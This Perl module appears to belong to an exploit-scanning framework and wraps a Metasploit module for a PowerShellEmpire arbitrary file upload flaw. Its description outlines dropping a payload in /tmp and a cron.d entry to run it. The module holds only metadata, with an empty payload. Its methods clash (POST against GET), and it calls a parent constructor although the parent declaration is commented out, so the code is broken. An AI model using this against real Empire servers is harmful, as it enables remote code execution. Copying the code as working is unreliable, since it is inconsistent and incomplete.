package MSFExploits::Exploits::EMPIRE::MSF::EmpireSkywalker;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::EMPIRE);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "EmpireSkywalker";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        A vulnerability existed in the PowerShellEmpire server prior to commit

        f030cf62 which would allow an arbitrary file to be written to an

        attacker controlled location with the permissions of the Empire server.



        This exploit will write the payload to /tmp/ directory followed by a

        cron.d file to execute the payload.

      ",
  METHOD => "POST",
  MSF_MODULE => "empire_skywalker",
  PATHS => [""],
  REFERENCES => ["http://www.harmj0y.net/blog/empire/empire-fails/"],
  TITLE => "PowerShellEmpire Arbitrary File Upload (Skywalker)",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Base URI path", VALUE => "/" },
    'STAGE0_URI' =>       {
  DESCRIPTION => "The resource requested by the initial launcher, default is index.asp",
  VALUE => "index.asp",
},
    'PROFILE' =>       { DESCRIPTION => "Empire agent traffic profile URI.", VALUE => "" },
    'STAGE1_URI' =>       {
  DESCRIPTION => "The resource used by the RSA key post, default is index.jsp",
  VALUE => "index.jsp",
},
    'SESSION_ID' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
